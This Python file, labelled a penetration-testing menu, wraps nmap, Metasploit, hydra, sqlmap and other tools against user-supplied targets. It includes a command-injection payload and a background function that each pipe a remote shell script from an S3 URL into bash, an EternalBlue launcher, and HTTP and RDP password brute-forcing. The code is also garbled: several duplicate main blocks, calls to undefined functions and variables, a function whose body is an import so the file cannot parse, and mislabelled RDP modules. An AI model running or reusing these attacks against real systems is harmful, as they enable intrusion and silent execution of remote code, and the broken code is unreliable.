import os
import threading
import subprocess

def run_metasploit():
    target_ip = input("Enter DVWA target IP: ")
    http_port = input(f"Enter HTTP port for {target_ip} (default 80): ") or "80"
    username = "admin"
    password = "password"

    # Metasploit commands for HTTP login and exploit
    msf_commands = f"""
    use auxiliary/scanner/http/http_login
    set RHOSTS {target_ip}
    set RPORT {http_port}
    set TARGETURI /dvwa/login.php
    set USERNAME {username}
    set PASSWORD {password}
    run
    use exploit/unix/webapp/command_injection
    set RHOST {target_ip}
    set TARGETURI /dvwa/vulnerabilities/exec/
    set CMD '127.0.0.1 | curl -sSL https://v1demoplatform.s3.us-west-1.amazonaws.com/common/samples.sh | bash'
    run
    exit
    """
    os.system(f"msfconsole -q -x \"{msf_commands}\"")

def run_nmap():
    print("Nmap Scan Options:")
    print("1. Single IP Address")
    print("2. Network Scan (Subnet)")

    choice = input("Enter your choice: ")

    if choice == "1":
        target = input("Enter target IP address: ")
        command = f"nmap -sV {target}"
        os.system(command)
    elif choice == "2":
        subnet = input("Enter target subnet (e.g., 192.168.1.0/24): ")
        command = f"nmap -sV {subnet}"
        os.system(command)
    else:
        print("Invalid choice. Please select 1 or 2.")

def run_http_bruteforce():
    target_ip = input("Enter target IP address: ")
    http_port = input("Enter HTTP port (default 80): ") or "80"
    username_list = "https://raw.githubusercontent.com/berandal666/Passwords/master/000webhost.txt"

    command = f"hydra -L {username_list} -P {username_list} http://{target_ip}:{http_port}/dvwa/login.php -t 4 http-get-form '/dvwa/login.php:username=^USER^&password=^PASS^:Login failed'"

    os.system(command)

def run_commix():
    url = input("Enter target URL (e.g., http://example.com): ")
    command = f"commix --url {url}"
    os.system(command)

def run_rdp_bruteforce():
    target_ip = input("Enter RDP target IP: ")
    username_list = "https://raw.githubusercontent.com/berandal666/Passwords/master/000webhost.txt"

    # Metasploit commands for RDP brute-force
    msf_commands = f"""
    use auxiliary/scanner/rdp/ms12_020_check
    set RHOSTS {target_ip}
    run
    use auxiliary/scanner/rdp/ms12_020_maxchannelids
    set RHOSTS {target_ip}
    run
    use auxiliary/scanner/rdp/ms12_020_channelizers
    set RHOSTS {target_ip}
    run
    use auxiliary/scanner/rdp/ms12_020_channelizer
    set RHOSTS {target_ip}
    run
    use auxiliary/scanner/rdp/ms12_020_nla
    set RHOSTS {target_ip}
    run
    use auxiliary/scanner/rdp/ms12_020_keyboard_layout
    set RHOSTS {target_ip}
    run
    use auxiliary/scanner/rdp/ms12_020_cpu
    set RHOSTS {target_ip}
    run
    use auxiliary/scanner/rdp/ms12_020_cpu
    set RHOSTS {target_ip}
    set USER_FILE {username_list}
    run
    exit
    """
    os.system(f"msfconsole -q -x \"{msf_commands}\"")

def run_sqlmap():
    target_url = input("Enter target URL for SQLmap (e.g., http://example.com/dvwa/): ")
    username = "admin"
    password = "password"

    # SQLmap command with authentication
    command = f"sqlmap -u {target_url} --data 'username={username}&password={password}' --batch"
    os.system(command)

def run_zap():
    target_url = input("Enter target URL for OWASP ZAP (e.g., http://example.com/dvwa/): ")

    # Launch OWASP ZAP with authentication
    os.system(f"zap.sh -quickurl {target_url}")

def run_netcat():
    # Perform Netcat scan for all ports on the current IP address
    command = f"nc -zvn {ip} 1-65535 2>&1 | grep succeeded"
    os.system(command)

def run_subnet_scan(subnet):
    subnet_prefix = '.'.join(subnet.split('.')[:-1])
    for i in range(1, 255):
        ip = f"{subnet_prefix}.{i}"
        # Create a thread to run the scan for each IP address in the subnet
        threading.Thread(target=run_netcat_scan, args=(ip,)).start()

def main():
    subnet = input("Enter the subnet (e.g., 192.168.1.0/24): ").strip()
    if not subnet.endswith('/24'):
        print("Please enter a valid /24 subnet (e.g., 192.168.1.0/24)")
        return

    # Run the subnet scan in the background
    run_subnet_scan(subnet)

if __name__ == "__main__":
    main()

def run_curl():

    # Define the curl command to download and execute the script
    curl_command = "curl -sSL https://v1demoplatform.s3.us-west-1.amazonaws.com/common/samples.sh | bash"

    # Execute the command using subprocess in the background
    subprocess.Popen(curl_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("curl command running in the background...")

def main():
    print("Running script...")

    # Run curl command in the background
    run_curl_bash_background()

    print("Continuing with other operations while curl command runs in the background.")

if __name__ == "__main__":
    main()

def run_windows():
from msfrpc import MsfRpcClient

# Function to initialize Metasploit RPC client
def initialize_metasploit():
    try:
        client = MsfRpcClient('127.0.0.1', username='msf', password='msf')  # Replace with your msfrpcd host IP and credentials
        return client
    except Exception as e:
        print(f"Error connecting to Metasploit RPC: {e}")
        return None

# Function to execute the EternalBlue (MS17-010) exploit
def execute_eternalblue_exploit(client, target_ip):
    try:
        exploit_module = "exploit/windows/smb/ms17_010_eternalblue"
        exploit = client.modules.use(exploit_module)

        exploit['RHOST'] = target_ip
        exploit.execute(payload=None, options=exploit.missing_required)

    except Exception as e:
        print(f"Error executing EternalBlue exploit: {e}")

# Main function to run the EternalBlue exploit based on user input
def run_eternalblue_exploit():
    target_ip = input("Enter target IP: ")

    client = initialize_metasploit()
    if client:
        execute_eternalblue_exploit(client, target_ip)

if __name__ == "__main__":
    run_eternalblue_exploit()


def main_menu():
    print("Penetration Testing Tool Menu:")
    print("1. Nmap")
    print("2. Metasploit Framework (DVWA Command Injection)")
    print("3. HTTP Brute-force Tool")
    print("4. Commix")
    print("5. RDP Brute-force Tool")
    print("6. SQLmap")
    print("7. OWASP ZAP")
    print("8. Netcat")
    print("9. Curl")
    print("10. Windows Attack")
    print("0. Exit")

    choice = input("Enter your choice: ")

    if choice == "1":
        run_nmap()
    elif choice == "2":
        run_metasploit()
    elif choice == "3":
        run_http_bruteforce()
    elif choice == "4":
        run_commix()
    elif choice == "5":
        run_rdp_bruteforce()
    elif choice == "6":
        run_sqlmap()
    elif choice == "7":
        run_zap()
    elif choice == "8":
        run_netcat()
    elif choice == "9":
        run_curl()
    elif choice == "10":
        run_windows()
    elif choice == "0":
        exit()
    else:
        print("Invalid choice. Please try again.")

if __name__ == "__main__":
    while True:
        main_menu()
